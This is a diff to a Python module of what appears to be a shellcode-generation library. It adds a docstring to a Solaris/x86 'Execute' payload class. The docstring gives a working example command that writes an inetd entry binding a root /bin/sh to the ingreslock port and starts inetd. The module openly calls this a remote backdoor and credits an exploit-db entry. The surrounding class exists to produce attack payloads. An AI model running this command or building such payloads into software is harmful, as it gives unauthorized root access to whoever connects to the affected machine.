@@ -30,14 +30,22 @@ __all__ = ["Execute"]
 
 from shellgen import Dynamic
 
-# For example this command sets up a trivial remote backdoor:
-# from shellgen.x86.solaris.execute import Execute
-# payload = Execute(
-#   "echo \"ingreslock stream tcp nowait root /bin/sh sh -i\">/tmp/x;"
-#   "/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x"
-# )
 
 class Execute (Dynamic):
+    """
+    Execute any command in Solaris/x86.
+
+    For example this command sets up a trivial remote backdoor::
+        from shellgen.x86.solaris.execute import Execute
+        payload = Execute(
+          "echo \"ingreslock stream tcp nowait root /bin/sh sh -i\">/tmp/x;"
+         "/usr/sbin/inetd -s /tmp/x; /bin/rm -f /tmp/x"
+        )
+
+    Based on anonymous code found on the Internet:
+    U{http://www.exploit-db.com/exploits/13502/}
+    """
+
     qualities = "payload"
     encoding  = "term_null"
 
